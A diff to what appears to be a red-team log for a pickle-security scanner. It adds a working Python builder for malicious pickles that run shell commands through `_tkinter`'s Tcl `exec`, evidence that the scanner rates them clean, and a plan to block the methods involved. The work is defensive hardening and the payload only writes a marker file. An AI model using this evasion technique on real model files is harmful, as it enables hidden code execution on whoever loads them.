@@ -6597,3 +6597,166 @@ Blocking plan:
 Performance note: four exact entries in the existing sorted policy table and
 no mailbox format simulation, path modeling, constructor blocking, or broad
 `mailbox` wildcard block.
+
+## Turn 119 - `_tkinter` Tcl interpreter command-execution gap
+
+Goal: produce another RCE-capable pickle that
+`packages/modelaudit-picklescan` does not flag, using stdlib `_tkinter` to
+create an embedded Tcl interpreter and run Tcl's process-spawning command.
+
+Candidate payload:
+
+- Call `_tkinter.create()` to create a Tcl interpreter object.
+- Call `_tkinter.TkappType.eval(interp, script)` with a Tcl script such as
+  `exec /bin/sh -c {printf owned-by-tcl-eval > /tmp/.../eval_marker}`.
+- Sibling form: call `_tkinter.TkappType.call(interp, "exec", "/bin/sh",
+  "-c", "printf owned-by-tcl-call > /tmp/.../call_marker")`.
+- No pickle global references `os`, `subprocess`, `sys`, `runpy`, `importlib`,
+  `builtins.exec`, or `builtins.eval`.
+- The strings contain Tcl command words, not Python-shaped `exec(...)`,
+  `eval(...)`, `import ...`, `os.system(...)`, or `subprocess.run(...)`
+  patterns.
+
+Representative protocol 4 payload builder:
+
+```python
+from collections.abc import Iterable
+from pathlib import Path
+
+
+def text(value: str) -> bytes:
+    data = value.encode()
+    if len(data) <= 0xFF:
+        return b"\x8c" + bytes([len(data)]) + data
+    return b"X" + len(data).to_bytes(4, "little") + data
+
+
+def sg(module: str, name: str) -> bytes:
+    return text(module) + text(name) + b"\x93"
+
+
+def tuple_for(values: Iterable[bytes]) -> bytes:
+    values = list(values)
+    if not values:
+        return b")"
+    if len(values) == 1:
+        return values[0] + b"\x85"
+    if len(values) == 2:
+        return values[0] + values[1] + b"\x86"
+    if len(values) == 3:
+        return values[0] + values[1] + values[2] + b"\x87"
+    return b"(" + b"".join(values) + b"t"
+
+
+eval_marker = Path("/tmp/ma_tkinter_eval_marker")
+eval_script = f"exec /bin/sh -c {{printf owned-by-tcl-eval > {eval_marker}}}"
+eval_payload = b"".join(
+    [
+        b"\x80\x04",
+        sg("_tkinter", "create"),
+        b")R\x94",
+        sg("_tkinter", "TkappType.eval"),
+        b"h\x00",
+        text(eval_script),
+        b"\x86R.",
+    ]
+)
+
+call_marker = Path("/tmp/ma_tkinter_call_marker")
+call_command = f"printf owned-by-tcl-call > {call_marker}"
+call_payload = b"".join(
+    [
+        b"\x80\x04",
+        sg("_tkinter", "create"),
+        b")R\x94",
+        sg("_tkinter", "TkappType.call"),
+        tuple_for(
+            [b"h\x00", text("exec"), text("/bin/sh"), text("-c"), text(call_command)]
+        ),
+        b"R.",
+    ]
+)
+```
+
+Proof on CPython 3.12.12 with `_tkinter` available:
+
+- Constructor control scanner result: `len=24`, `status=complete`,
+  `verdict=clean`, `is_clean=True`, `findings=[]`, `notices=[]`,
+  `errors=[]`
+- Constructor control coverage: `bytes_scanned=24`, `bytes_total=24`,
+  `opcode_count=7`, `raw_scan_complete=True`,
+  `opcode_scan_complete=True`
+- Constructor control import references: `_tkinter.create` with
+  `is_dangerous=False`
+- Constructor control runtime: `pickle.loads(control)` returns a
+  `_tkinter.tkapp` interpreter object and performs no command execution.
+- Eval scanner result: `len=189`, `status=complete`, `verdict=clean`,
+  `is_clean=True`, `findings=[]`, `notices=[]`, `errors=[]`
+- Eval coverage: `bytes_scanned=189`, `bytes_total=189`,
+  `opcode_count=15`, `raw_scan_complete=True`,
+  `opcode_scan_complete=True`
+- Eval import references: `_tkinter.create` and
+  `_tkinter.TkappType.eval`, both with `is_dangerous=False`
+- Eval string heuristic matches: `[]`
+- Eval runtime: before unpickle the marker is absent; after
+  `pickle.loads(eval_payload)`, the marker exists and contains
+  `owned-by-tcl-eval`.
+- Call scanner result: `len=191`, `status=complete`, `verdict=clean`,
+  `is_clean=True`, `findings=[]`, `notices=[]`, `errors=[]`
+- Call coverage: `bytes_scanned=191`, `bytes_total=191`,
+  `opcode_count=19`, `raw_scan_complete=True`,
+  `opcode_scan_complete=True`
+- Call import references: `_tkinter.create` and
+  `_tkinter.TkappType.call`, both with `is_dangerous=False`
+- Call string heuristic matches: `[]`
+- Call runtime: before unpickle the marker is absent; after
+  `pickle.loads(call_payload)`, the marker exists and contains
+  `owned-by-tcl-call`.
+
+RCE mechanism:
+
+- `_tkinter.create()` exposes a full Tcl interpreter even when no Tk window is
+  created.
+- Tcl's built-in `exec` command spawns arbitrary local processes. The lower
+  level `.call()` form can invoke it as command argv, and `.eval()` can invoke
+  it through Tcl source text.
+- This bypasses module/global policy because the process execution happens
+  inside Tcl, not through Python's `os` or `subprocess` modules.
+- It bypasses string heuristics because the payload uses Tcl syntax and does
+  not contain Python call-like dangerous literals.
+
+Why the scanner missed it:
+
+- `_tkinter` is not a wildcard-dangerous module.
+- `_tkinter.create`, `_tkinter.TkappType.eval`, and
+  `_tkinter.TkappType.call` are absent from `DANGEROUS_GLOBALS`.
+- The payload has complete opcode coverage, no scan errors, no findings, no
+  notices, and no suspicious-string matches.
+
+Performance note: the focused next block should add exact dangerous-global
+entries for `_tkinter.TkappType.eval` and `_tkinter.TkappType.call`. Blocking
+those process-capable interpreter dispatch methods catches the RCE-grade
+surface while avoiding broad `_tkinter` wildcard blocking or Tcl script
+inspection. Blocking `_tkinter.create` is optional but higher false-positive
+risk because interpreter construction alone does not execute commands.
+
+## Turn 120 - Block `_tkinter` Tcl interpreter dispatch
+
+Blocking plan:
+
+- Add exact dangerous-global entries for `_tkinter.TkappType.call` and
+  `_tkinter.TkappType.eval`.
+- Leave `_tkinter.create` allowed. The constructor-only control can create a
+  Tcl interpreter object, but it does not execute commands without a later
+  process-capable dispatch.
+- Add a CPython oracle regression for both Turn 119 execution variants. The
+  control payload remains clean and returns a `_tkinter.tkapp`; the active
+  payloads are malicious and still write marker files through Tcl's `exec`
+  command when unpickled.
+- Skip the runtime regression when `_tkinter` is unavailable in the Python
+  build.
+- Add a changelog entry under `[Unreleased]`.
+
+Performance note: two exact entries in the existing sorted policy table and no
+Tcl script parsing, command-word inspection, constructor blocking, or broad
+`_tkinter` wildcard block.
